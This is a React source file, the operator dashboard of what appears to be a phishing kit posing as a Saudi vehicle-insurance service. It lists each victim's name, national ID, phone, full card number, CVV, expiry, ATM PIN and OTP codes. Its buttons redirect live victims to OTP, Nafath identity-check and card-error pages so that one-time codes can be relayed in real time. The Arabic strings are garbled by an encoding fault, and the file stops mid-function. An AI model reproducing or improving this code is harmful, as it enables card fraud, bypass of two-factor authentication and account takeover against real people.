ï»¿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
import { useLocation } from "wouter";
import { getToken, logoutAdmin } from "@/lib/auth";
import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getTrackedSessions, type SessionTrackingInfo } from "@/lib/api";
import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut,
  Clock,
  ShieldCheck,
  CreditCard,
  KeyRound,
  Banknote,
  ChevronDown,
  ChevronUp,
} from "lucide-react";
import { ToastContainer, toast } from "@/lib/toast-store";

interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}Ø«`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}Ø¯`;
  return `${Math.floor(mins / 60)}Ø³`;
}

function formatTimeCounter(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  
  if (secs < 60) {
    return `ÙÙØ° ${secs} Ø«Ø§ÙÙØ©`;
  }
  
  const mins = Math.floor(secs / 60);
  if (mins < 60) {
    const remainingSecs = secs % 60;
    return `ÙÙØ° ${mins} Ø¯ÙÙÙØ©${remainingSecs > 0 ? ` Ù ${remainingSecs} Ø«Ø§ÙÙØ©` : ""}`;
  }
  
  const hours = Math.floor(mins / 60);
  if (hours < 24) {
    const remainingMins = mins % 60;
    return `ÙÙØ° ${hours} Ø³Ø§Ø¹Ø©${remainingMins > 0 ? ` Ù ${remainingMins} Ø¯ÙÙÙØ©` : ""}`;
  }
  
  const days = Math.floor(hours / 24);
  if (days < 7) {
    const remainingHours = hours % 24;
    return `ÙÙØ° ${days} ÙÙÙ${remainingHours > 0 ? ` Ù ${remainingHours} Ø³Ø§Ø¹Ø©` : ""}`;
  }
  
  const weeks = Math.floor(days / 7);
  if (weeks < 4) {
    const remainingDays = days % 7;
    return `ÙÙØ° ${weeks} Ø§Ø³Ø¨ÙØ¹${remainingDays > 0 ? ` Ù ${remainingDays} ÙÙÙ` : ""}`;
  }
  
  // For older records, show actual date
  const date = new Date(iso);
  return date.toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric" });
}

function getTypeArabic(type: string): string {
  const typeMap: Record<string, string> = {
    "initial": "Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØ´Ø®ØµÙØ©",
    "vehicle": "Ø¨ÙØ§ÙØ§Øª Ø§ÙÙØ±ÙØ¨Ø©",
    "payment": "Ø§ÙØ¯ÙØ¹",
    "card": "Ø¨ÙØ§ÙØ§Øª Ø§ÙØ¨Ø·Ø§ÙØ©",
    "atm": "ØµØ±Ø§Ù ATM",
    "nomer": "Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù",
    "nomer_otp": "OTP Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù",
    "otp_attempt_1": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ (ÙØ­Ø§ÙÙØ© 1)",
    "otp_attempt_2": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ (ÙØ­Ø§ÙÙØ© 2)",
    "otp_attempt_3": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ (ÙØ­Ø§ÙÙØ© 3)",
  };
  return typeMap[type] || type.toUpperCase();
}

function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-3xl border bg-white p-4 text-right shadow-sm transition ${onClick ? "hover:shadow-md cursor-pointer active:scale-[0.98]" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-3">
        <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-3xl font-bold text-slate-900">{value}</span>
      </div>
      <p className="text-xs text-slate-500">{label}</p>
      {onClick && <p className="text-xs text-blue-500 mt-2">Ø§ÙÙØ± ÙÙØªÙØ§ØµÙÙ</p>}
    </button>
  );
}

function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
  if (!open) return null;
  
  // Sort rows by ID descending (newest first) for display
  const sortedRows = [...rows].sort((a, b) => b.id - a.id);
  
  return (
    <Dialog open onOpenChange={(value) => !value && onClose()}>
      <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>Ø³Ø¬Ù Ø§ÙØ¬ÙØ³Ø©</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-4">
          <div className="space-y-4">
            {sortedRows.map((row) => {
              const data = parseData(row.data);
              return (
                <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between text-xs text-slate-500 mb-3">
                    <span>{row.type.toUpperCase()}</span>
                    <span dir="ltr">{formatAgo(row.createdAt)}</span>
                  </div>
                  <div className="grid gap-3 sm:grid-cols-2 text-xs text-slate-700">
                    {Object.entries(data).map(([key, value]) => (
                      <div key={key} className="rounded-2xl bg-slate-50 p-3">
                        <div className="font-semibold text-slate-900">{key}</div>
                        <div className="mt-1 font-mono break-all">{String(value ?? "")}</div>
                      </div>
                    ))}
                    <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
                      <div>IP: {row.ipAddress ?? "ØºÙØ± ÙØ¹Ø±ÙÙ"}</div>
                      <div>Ø§ÙÙØ³ØªØ®Ø¯Ù: {row.userAgent ?? "ØºÙØ± ÙØ¹Ø±ÙÙ"}</div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

// Page Arabic names mapping
function getPageArabic(page: string): string {
  const pageMap: Record<string, string> = {
    "/": "Ø§ÙØµÙØ­Ø© Ø§ÙØ±Ø¦ÙØ³ÙØ©",
    "/form": "Ø¨ÙØ§ÙØ§Øª Ø§ÙÙØ±ÙØ¨Ø©",
    "/select": "Ø§Ø®ØªÙØ§Ø± Ø§ÙØ¨Ø§ÙØ©",
    "/total": "ÙÙØ®Øµ Ø§ÙØªÙÙÙØ©",
    "/total2": "ØªØ£ÙÙØ¯ Ø§ÙØªÙÙÙØ©",
    "/visa": "Ø§ÙØ¯ÙØ¹ Ø¨Ø§ÙØ¨Ø·Ø§ÙØ©",
    "/otp": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ",
    "/otp2": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ (ÙØ­Ø§ÙÙØ© 2)",
    "/otp3": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ (ÙØ­Ø§ÙÙØ© 3)",
    "/atm": "ØµØ±Ø§Ù ATM",
    "/nomer": "Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù",
    "/nomer-wait": "Ø§ÙØªØ¸Ø§Ø± Ø§ÙØªØ­ÙÙ",
    "/nomer-otp": "Ø±ÙØ² Ø§ÙØªØ­ÙÙ ÙØ±ÙÙ Ø§ÙØ¬ÙØ§Ù",
    "/identity-check": "Ø§ÙØªØ­ÙÙ ÙÙ Ø§ÙÙÙØ§Ø° Ø§ÙÙØ·ÙÙ",
    "/waiting": "ÙØ§Ø¦ÙØ© Ø§ÙØ§ÙØªØ¸Ø§Ø±",
  };
  return pageMap[page] || page || "ØºÙØ± ÙØ¹Ø±ÙÙ";
}

function SessionBox({
  sessionId,
  rows,
  blocked,
  selected,
  onToggleSelect,
  onControl,
  onBlock,
  onUnblock,
  onDelete,
  onOpenHistory,
  currentPage,
  isOnline,
}: {
  sessionId: string;
  rows: SubmissionRow[];
  blocked?: string;
  selected: boolean;
  onToggleSelect: () => void;
  onControl: (sessionId: string, action: string, code?: string) => Promise<void>;
  onBlock: () => void;
  onUnblock: () => void;
  onDelete: () => void;
  onOpenHistory: () => void;
  currentPage?: string;
  isOnline?: boolean;
}) {
  const [expanded, setExpanded] = useState(true);
  const [historyExpanded, setHistoryExpanded] = useState(false);
  const [loadingAction, setLoadingAction] = useState<string | null>(null);

  // Rows are already sorted by ID DESC (newest first) from parent useMemo
  const initialRow = rows.find((row) => row.type === "initial");
  const initialData = parseData(initialRow?.data ?? null);
  const name = initialData.ownerName || "ÙØ³ØªØ®Ø¯Ù";
  const phone = initialData.phone || "Ø¨Ø¯ÙÙ ÙØ§ØªÙ";
  const cardRows = rows.filter((row) => row.type === "card");
  // Use FIRST card (newest) since rows are sorted by ID desc
  const latestCard = cardRows[0];
  const cardData = parseData(latestCard?.data ?? null);
  const otpRows = rows.filter((row) => row.type.startsWith("otp"));
  const atmRows = rows.filter((row) => row.type === "atm");
  const nomerRows = rows.filter((row) => row.type === "nomer");
  const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
  // Use first row (newest) for lastActivity since rows are sorted desc by id
  const lastActivity = rows[0]?.createdAt;

  const statusBadge = blocked
    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">ÙØ­Ø¸ÙØ±</Badge>
    : otpRows.length > 0
      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP â</Badge>
      : cardRows.length > 0
        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ÙÙØªØ¸Ø±</Badge>
        : <Badge variant="outline" className="text-slate-400 text-[10px]">Ø¨ÙØ§ÙØ§Øª ÙÙØ·</Badge>;

  const formattedCard = latestCard && cardData.cardNumber
    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "â";

  useEffect(() => {
    setExpanded(cardRows.length > 0 || otpRows.length > 0);
  }, [cardRows.length, otpRows.length]);

  const handleControl = async (action: string, code?: string) => {
    setLoadingAction(action);
    try {
      await onControl(sessionId, action, code);
    } finally {
      setLoadingAction(null);
    }
  };

  return (
    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""}`}>
      <div className="p-4">
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              checked={selected}
              onChange={onToggleSelect}
              className="mt-1 h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
            />
            <div className="min-w-0 text-right">
              <button type="button" onClick={() => setExpanded((value) => !value)} className="w-full text-right">
                <div className="flex items-center justify-between gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      {/* Online/Offline Status Indicator */}
                      <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
                      <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                    </div>
                    <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                    {/* Current Page */}
                    <p className="text-[10px] text-blue-600 font-medium">
                      ð {getPageArabic(currentPage || "")}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500">
                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "â"}</span>
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>
                <div className="mt-2 flex items-center justify-between gap-2">
                  {statusBadge}
                  <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                </div>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-2 self-end">
            <button
              type="button"
              onClick={blocked ? onUnblock : onBlock}
              className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
            >{blocked ? "Ø±ÙØ¹ Ø§ÙØ­Ø¸Ø±" : "Ø­Ø¸Ø±"}</button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
            >Ø³ÙØ© Ø§ÙÙÙÙÙØ§Øª</button>
          </div>
        </div>

        {expanded && (
          <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
            {/* ØµÙØ¯ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙÙØ±ÙØ¨Ø© */}
            <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
              <p className="text-xs font-semibold text-slate-500 mb-3">Ø¨ÙØ§ÙØ§Øª Ø§ÙÙØ±ÙØ¨Ø©</p>
              
              {/* Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØ´Ø®ØµÙØ© */}
              <div className="mb-4">
                <p className="text-[10px] text-slate-400 mb-2">Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØ´Ø®ØµÙØ©</p>
                <div className="grid gap-2 sm:grid-cols-2 text-xs">
                  <div className="rounded-xl bg-white p-2">Ø§ÙØ§Ø³Ù: <span className="font-semibold">{name}</span></div>
                  <div className="rounded-xl bg-white p-2">Ø§ÙÙØ§ØªÙ: <span className="font-semibold" dir="ltr">{phone}</span></div>
                  <div className="rounded-xl bg-white p-2">Ø±ÙÙ Ø§ÙÙÙÙØ©: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "â"}</span></div>
                  <div className="rounded-xl bg-white p-2">ÙÙØ¹ Ø§ÙØªØ§ÙÙÙ: <span className="font-semibold">{initialData.insuranceType ?? "â"}</span></div>
                </div>
              </div>

              {/* Ø¨ÙØ§ÙØ§Øª Ø§ÙØ¨Ø·Ø§ÙØ© */}
              {latestCard ? (
                <div>
                  <p className="text-[10px] text-slate-400 mb-2">Ø¨ÙØ§ÙØ§Øª Ø§ÙØ¨Ø·Ø§ÙØ©</p>
                  <div className="grid gap-2 sm:grid-cols-2 text-xs">
                    <div className="rounded-xl bg-white p-2 sm:col-span-2">
                      Ø±ÙÙ Ø§ÙØ¨Ø·Ø§ÙØ©: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
                    </div>
                    <div className="rounded-xl bg-white p-2">Ø§ÙÙØ§ÙÙ: <span className="font-semibold">{cardData.cardHolder ?? "â"}</span></div>
                    <div className="rounded-xl bg-white p-2">ØªØ§Ø±ÙØ® Ø§ÙØ§ÙØªÙØ§Ø¡: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "â"}</span></div>
                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "â"}</span></div>
                  </div>
                </div>
              ) : (
                <div className="rounded-3xl border border-dashed border-slate-300 bg-white p-3 text-xs text-slate-500 text-center">
                  ÙØ§ ØªÙØ¬Ø¯ Ø¨Ø·Ø§ÙØ© Ø­ØªÙ Ø§ÙØ¢Ù
                </div>
              )}
            </div>

            {otpRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>Ø±ÙÙØ² OTP</span>
                  <span>{otpRows.length} Ø±ÙØ²</span>
                </div>
                <div className="space-y-2">
                  {otpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                        <div className="flex items-center justify-between gap-3 mb-2">
                          <span className="font-semibold text-green-700">Ø§ÙØ±ÙØ² {index + 1}</span>
                          <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "â"}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {atmRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
                <div className="flex items-center justify-between mb-3 text-slate-500">
                  <span>Ø¨ÙØ§ÙØ§Øª ATM</span>
                </div>
                {atmRows.map((atm) => {
                  const data = parseData(atm.data);
                  return (
                    <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
                        <span>Ø±ÙØ² ATM</span>
                        <span dir="ltr">{formatAgo(atm.createdAt)}</span>
                      </div>
                      <div className="font-mono font-semibold">{data.atmCode ?? "â"}</div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* Ø¨ÙØ§ÙØ§Øª Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù */}
            {nomerRows.length > 0 && (
              <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
                  <span> Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù</span>
                  <span>{nomerRows.length} Ø§ÙÙØ­Ø§ÙÙØ§Øª</span>
                </div>
                {nomerRows.map((nomer) => {
                  const data = parseData(nomer.data);
                  const providerNames: Record<string, string> = {
                    stc: "STC",
                    mobily: "ÙÙØ¨Ø§ÙÙÙ",
                    zain: "Ø²ÙÙ",
                    jawra: "Ø¬ÙØ§Ù"
                  };
                  return (
                    <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                        <span>ÙÙØª Ø§ÙØ§Ø¯Ø®Ø§Ù </span>
                        <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
                      </div>
                      <div className="space-y-1 text-xs">
                        <div className="flex justify-between">
                          <span className="text-slate-500">ÙØ²ÙØ¯ Ø§ÙØ®Ø¯ÙØ©:</span>
                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "â"}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù:</span>
                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "â"}</span>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* Ø±ÙØ² ØªØ­ÙÙ Ø±ÙÙ Ø§ÙØ¬ÙØ§Ù */}
            {nomerOtpRows.length > 0 && (
              <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>Ø±ÙØ² ØªØ­ÙÙ Ø§ÙØ¬ÙØ§Ù</span>
                  <span>{nomerOtpRows.length} Ø±ÙØ²</span>
                </div>
                <div className="space-y-2">
                  {nomerOtpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-white p-3">
                        <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                          <span>ÙØ­Ø§ÙÙØ© {index + 1}</span>
                          <span dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900 text-center" dir="ltr">
                          {data.otpCode ?? "â"}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* Ø§ÙØªØ­ÙÙ ÙÙ Ø§ÙÙÙÙØ© */}
            <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
              <div className="text-xs font-semibold text-purple-700 mb-3">Ø§ÙØªØ­ÙÙ ÙÙ Ø§ÙÙÙØ§Ø° Ø§ÙÙØ·ÙÙ</div>
              <div className="flex gap-2">
                <input
                  type="text"
                  id={`identity-code-${sessionId}`}
                  placeholder="Ø§ÙØªØ¨ Ø±ÙØ² Ø§ÙØªÙØ«ÙÙ "
                  className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
                  maxLength={10}
                />
                <button
                  type="button"
                  disabled={loadingAction === "identity_code"}
                  onClick={async () => {
                    const input = document.getElementById(`identity-code-${sessionId}`) as HTMLInputElement;
                    const code = input?.value?.trim();
                    if (!code) return;
                    setLoadingAction("identity_code");
                    try {
                      await onControl(sessionId, "identity_code", code);
                    } finally {
                      setLoadingAction(null);
                      if (input) input.value = "";
                    }
                  }}
                  className="rounded-2xl bg-purple-600 px-4 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {loadingAction === "identity_code" ? "Ø¬Ø§Ø±Ù..." : "Ø¥Ø±Ø³Ø§Ù"}
                </button>
              </div>
              <p className="mt-2 text-[10px] text-purple-600">Ø§Ø¯Ø®Ù Ø±ÙØ² Ø§ÙØªÙØ«ÙÙ  </p>
            </div>

            {/* Ø£Ø²Ø±Ø§Ø± Ø§ÙØªØ­ÙÙ */}
            <div className="space-y-3">
              <p className="text-[10px] text-slate-400 font-semibold">Ø§Ø¹Ø§Ø¯Ø© ÙÙØµÙØ­Ø§Øª Ø§ÙØ§ÙÙÙ </p>
              <div className="grid gap-2 sm:grid-cols-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_home"}
                  onClick={() => void handleControl("go_home")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_home" ? "...Ø¬Ø§Ø±Ù" : "ð  Ø§ÙØ±Ø¦ÙØ³ÙØ©"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_form"}
                  onClick={() => void handleControl("go_form")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_form" ? "...Ø¬Ø§Ø±Ù" : "ð Ø¨ÙØ§ÙØ§Øª Ø§ÙÙØ±ÙØ¨Ø©"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_select"}
                  onClick={() => void handleControl("go_select")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_select" ? "...Ø¬Ø§Ø±Ù" : "ð¢ Ø§Ø®ØªÙØ§Ø± Ø§ÙØªØ£ÙÙÙ"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_visa"}
                  onClick={() => void handleControl("go_visa")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_visa" ? "...Ø¬Ø§Ø±Ù" : "ð³ Ø§ÙÙÙØ²Ø§"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">ØªØ­ÙÙÙ ÙØµÙØ­Ø§Øª Ø§ÙØªÙØ«ÙÙ</p>
              <div className="grid gap-2 sm:grid-cols-4">
                <button
                  type="button"
                  disabled={loadingAction === "go_otp"}
                  onClick={() => void handleControl("go_otp")}
                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_otp" ? "..." : "ð OTP"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer"}
                  onClick={() => void handleControl("go_nomer")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer" ? "..." : "ð± Ø§Ø¯Ø®Ø§Ù Ø±ÙÙ Ø§ÙÙØ§ØªÙ"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer_otp"}
                  onClick={() => void handleControl("go_nomer_otp")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer_otp" ? "..." : "ð± Ø±ÙØ² ØªØ­ÙÙ Ø±ÙÙ Ø§ÙÙØ§ØªÙ"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_identity_check"}
                  onClick={() => void handleControl("go_identity_check")}
                  className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_identity_check" ? "..." : "ð Ø±ÙØ² ØªÙØ«ÙÙ Ø§ÙÙÙØ§Ø°"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÙØ§Ø¦ÙØ© Ø§ÙØ§ÙØªØ¸Ø§Ø±</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_waiting"}
                  onClick={() => void handleControl("go_waiting")}
                  className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_waiting" ? "
                Ø¬Ø§Ø±Ù" 
                  : "â³ ÙØ§Ø¦ÙØ© Ø§ÙØ§ÙØªØ¸Ø§Ø± Ø§ÙØ¹Ø§ÙÙ "}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">Ø®Ø·Ø£</p>
              <div className="grid gap-2">
                <button
                  type="button"
                  disabled={loadingAction === "card_error"}
                  onClick={() => void handleControl("card_error")}
                  className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "card_error" ? "..." : "â Ø®Ø·Ø£ ÙÙØ¨Ø·Ø§ÙØ© ÙÙØ·"}</button>
              </div>
            </div>
          </div>
        )}
        
        {/* Ø§ÙØªØ§Ø±ÙØ®Ù / Ø§ÙØ£Ø±Ø´ÙÙ Section */}
        <div className="border-t border-slate-100">
          <button
            type="button"
            onClick={() => setHistoryExpanded(!historyExpanded)}
            className="flex w-full items-center justify-between px-4 py-2 text-xs text-slate-500 hover:bg-slate-50 transition-colors"
          >
            <span className="flex items-center gap-2">
              <Clock className="w-3 h-3" />
              Ø§ÙØ³Ø¬Ù Ø§ÙØ§Ø¯Ø®Ø§ÙØ§Øª  ({rows.length} Ø§ÙØ¹Ø¯Ø¯)
            </span>
            {historyExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </button>
          
          {historyExpanded && (
            <div className="px-4 pb-3 space-y-2 max-h-96 overflow-y-auto">
              {rows.map((row, index) => {
                const data = parseData(row.data);
                const prevRow = index < rows.length - 1 ? rows[index + 1] : null;
                const prevData = prevRow ? parseData(prevRow.data) : null;
                
                // De-duplication: skip if data is identical to previous row
                const isDuplicate = prevData && JSON.stringify(data) === JSON.stringify(prevData);
                if (isDuplicate) return null;
                
                const isLatest = index === 0;
                
                return (
                  <div
                    key={row.id}
                    className={`rounded-xl p-3 text-[11px] ${
                      isLatest 
                        ? "bg-blue-50 border border-blue-200" 
                        : "bg-slate-50 border border-slate-200"
                    }`}
                  >
                    {/* Header */}
                    <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-200">
                      <div className="flex items-center gap-2">
                        <span className={`font-bold ${isLatest ? "text-blue-700" : "text-slate-700"}`}>
                          {getTypeArabic(row.type)}
                        </span>
                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">Ø§ÙØ£Ø­Ø¯Ø«</span>}
                      </div>
                      <div className="flex items-center gap-2 text-slate-400">
                        <span className="text-[10px]">{formatTimeCounter(row.createdAt)}</span>
                        <span className="text-[9px]">â¢</span>
                        <span className="text-[9px]">#{row.id}</span>
                      </div>
                    </div>
                    
                    {/* Full Data - No Truncation */}
                    <div className="space-y-1.5">
                      {Object.entries(data).map(([key, value]) => (
                        <div key={key} className="flex items-start gap-2 py-1 border-b border-slate-100 last:border-0">
                          <span className="text-slate-500 min-w-[100px] font-semibold">{key}:</span>
                          <span className="font-mono text-slate-800 break-all flex-1">{String(value ?? "")}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [rawRows, setRawRows] = useState<SubmissionRow[]>([]);
  const [stats, setStats] = useState<StatsType | null>(null);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [blockedSessions, setBlockedSessions] = useState(getBlockedSessions());
  const [trashItems, setTrashItems] = useState(getTrashItems());
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [trashOpen, setTrashOpen] = useState(false);
  const [passwordOpen, setPasswordOpen] = useState(false);
  const [historyDialog, setHistoryDialog] = useState<{ sessionId: string; rows: SubmissionRow[] } | null>(null);
  const [settings, setSettings] = useState(getAdminSettings());
  const [passwordValue, setPasswordValue] = useState("");
  const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
  const intervalRef = useRef<number | null>(null);
  
  // Track session online status and current page
  const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});

  const sessions = useMemo(() => {
    const trashedIds = new Set(trashItems.map((item) => item.id));
    const grouped: Record<string, SubmissionRow[]> = {};
    rawRows
      .filter((row) => !trashedIds.has(row.id))
      .forEach((row) => {
        if (!grouped[row.sessionId]) grouped[row.sessionId] = [];
        grouped[row.sessionId].push(row);
      });

    // Sort EACH session's rows by ID DESCENDING (newest first) - CRITICAL FIX
